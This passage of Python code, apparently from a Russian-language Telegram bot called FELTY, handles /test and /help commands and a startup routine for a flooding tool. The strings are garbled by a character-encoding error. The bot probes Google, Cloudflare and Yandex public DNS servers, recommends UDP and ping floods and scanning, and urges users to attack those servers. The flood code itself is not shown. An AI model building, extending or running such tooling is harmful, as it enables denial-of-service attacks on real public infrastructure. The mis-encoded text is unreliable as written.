    bot.send_message(message.chat.id, "üîß –¢–µ—Å—Ç–∏—Ä—É—é —Ä–∞–±–æ—Ç—É —Å –ø—É–±–ª–∏—á–Ω—ã–º–∏ —Ü–µ–ª—è–º–∏...")
    
    test_targets = [
        ('8.8.8.8', 'Google DNS'),
        ('1.1.1.1', 'Cloudflare'),
        ('77.88.8.8', 'Yandex DNS')
    ]
    
    results = []
    for ip, name in test_targets:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.settimeout(2)
            # –ü—Ä–æ–±—É–µ–º –æ—Ç–ø—Ä–∞–≤–∏—Ç—å UDP –ø–∞–∫–µ—Ç
            sock.sendto(b"TEST", (ip, 53))
            results.append(f"‚úÖ {name} ({ip}) - —Ä–∞–±–æ—Ç–∞–µ—Ç")
        except:
            results.append(f"‚ùå {name} ({ip}) - –Ω–µ –¥–æ—Å—Ç—É–ø–µ–Ω")
        finally:
            sock.close()
    
    bot.send_message(message.chat.id, 
        "<b>–†–µ–∑—É–ª—å—Ç–∞—Ç—ã —Ç–µ—Å—Ç–∞:</b>\n\n" + "\n".join(results) + 
        "\n\nüí° <i>–ò—Å–ø–æ–ª—å–∑—É–π—Ç–µ —Ä–∞–±–æ—á–∏–µ —Ü–µ–ª–∏ –¥–ª—è –∞—Ç–∞–∫</i>", 
        parse_mode='HTML')

@bot.message_handler(commands=['help'])
def show_help(message):
    help_text = (
        "<b>üÜò –ü–û–ú–û–©–¨ FELTY</b>\n\n"
        "<b>–†–µ—à–∞–µ–º –ø—Ä–æ–±–ª–µ–º—É 'Connection refused':</b>\n\n"
        "1. <b>–ò—Å–ø–æ–ª—å–∑—É–π—Ç–µ UDP –§–ª—É–¥</b> - –∏–≥–Ω–æ—Ä–∏—Ä—É–µ—Ç –∑–∞–∫—Ä—ã—Ç—ã–µ –ø–æ—Ä—Ç—ã\n"
        "2. <b>–ò—Å–ø–æ–ª—å–∑—É–π—Ç–µ –ø—É–±–ª–∏—á–Ω—ã–µ DNS</b> - –≤—Å–µ–≥–¥–∞ –æ—Ç–≤–µ—á–∞—é—Ç:\n"
        "   ‚Ä¢ 8.8.8.8 - Google\n"
        "   ‚Ä¢ 1.1.1.1 - Cloudflare\n"
        "   ‚Ä¢ 77.88.8.8 - Yandex\n\n"
        "3. <b>Ping —Ñ–ª—É–¥</b> - —Ä–∞–±–æ—Ç–∞–µ—Ç –Ω–∞ –ª—é–±–æ–π –æ–Ω–ª–∞–π–Ω —Ö–æ—Å—Ç\n"
        "4. <b>TCP —Å–∫–∞–Ω–∏—Ä–æ–≤–∞–Ω–∏–µ</b> - –Ω–µ —Ç—Ä–µ–±—É–µ—Ç –æ—Ç–∫—Ä—ã—Ç—ã—Ö –ø–æ—Ä—Ç–æ–≤\n\n"
        "<b>–ö–æ–º–∞–Ω–¥—ã:</b>\n"
        "/start - –ì–ª–∞–≤–Ω–æ–µ –º–µ–Ω—é\n"
        "/status - –°—Ç–∞—Ç—É—Å –∞—Ç–∞–∫–∏\n"
        "/test - –ü—Ä–æ–≤–µ—Ä–∫–∞ —Ü–µ–ª–µ–π\n"
        "/help - –°–ø—Ä–∞–≤–∫–∞"
    )
    bot.send_message(message.chat.id, help_text, parse_mode='HTML')

if __name__ == "__main__":
    print("üü¢ FELTY BOT –∑–∞–ø—É—Å–∫–∞–µ—Ç—Å—è...")
    print("üîß –ê—Ç–∞–∫–∏ —Ä–∞–±–æ—Ç–∞—é—Ç –¥–∞–∂–µ –Ω–∞ –∑–∞–∫—Ä—ã—Ç—ã–µ –ø–æ—Ä—Ç—ã!")
    print("üéØ –ò—Å–ø–æ–ª—å–∑—É–π—Ç–µ: 8.8.8.8, 1.1.1.1, 77.88.8.8")
    
    try:
        bot.infinity_polling()
    except Exception as e:
        print(f"üî¥ –û—à–∏–±–∫–∞ –±–æ—Ç–∞: {e}")
